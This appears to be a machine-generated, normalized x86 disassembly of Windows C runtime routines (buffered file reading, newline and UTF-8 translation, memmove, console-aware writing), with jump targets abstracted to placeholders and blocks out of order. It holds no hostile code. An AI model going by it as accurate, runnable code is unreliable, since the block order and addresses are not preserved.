push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_41a95b
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4150cb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_410cee
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_419eda
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_40fd92
pop ecx
push eax
call sub_4157b8
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_40fd92
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_40fd92
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_40fd92
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_40fd92
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_4151f6
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_410d01
and [ eax ] 0x0
call sub_410cee
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_410d01
mov [ eax ] ebx
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_410d01
mov [ eax ] ebx
call sub_410cee
mov [ eax ] 0x9
jmp r-xdata
call sub_410d01
mov [ eax ] ebx
call sub_410cee
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40edf4
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_413ed3
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_419d3c
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_410cee
mov [ eax ] 0xc
call sub_410d01
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_410d14
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_410135
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_410cee
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_419d3c
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_419d3c
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_419d3c
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_4157b8
push 0x10
push r--data
call sub_4143e0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_410d01
and [ eax ] 0x0
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] esi
call sub_410cee
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_414425
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_4176ed
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_410d01
mov [ eax ] esi
call sub_410cee
mov [ eax ] 0x16
jmp r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4151f6
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40edf4
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4158ab
mov eax [ ebp - 0x1c ]
sub_4158c0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_415948 ]
jmp [ ecx * 4 + jump_table_4159c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_415a34 ]
pop esi
pop edi
pop ebp
jmp sub_4179d5
jmp [ ecx * 4 + jump_table_415bd0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_415ad4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_415bd0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_415a34 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_415bd0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_415a34 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_415a34 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_415a34 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_415bd0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_415bd0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_415bd0 ]
sub_415c25
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_41c2a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_410d01
mov [ eax ] esi
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40e1e0
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_410d01
xor esi esi
mov [ eax ] esi
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_419f23
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_419d3c
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_41371e
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_410cee
mov [ eax ] 0x1c
call sub_410d01
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_410d14
pop ecx
jmp r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_41a17f
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
